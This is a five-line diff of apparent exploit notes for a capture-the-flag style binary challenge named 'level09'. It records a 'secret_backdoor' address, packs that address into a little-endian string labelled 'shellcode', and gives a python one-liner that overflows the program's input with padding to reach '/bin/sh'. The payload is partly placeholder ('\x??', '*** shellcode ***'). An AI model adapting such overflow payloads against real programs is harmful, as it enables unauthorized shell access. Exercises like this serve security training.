@@ -1,0 +1,5 @@
+secret_backdoor = 0x000055555555488c
+
+shellcode = '\x8c\x48\x55\x55\x55\x55\x00\x00'
+
+python -c "print 'A' * 40 + '\x??' + '*** shellcode ***' + '/bin/sh'" | ./level09
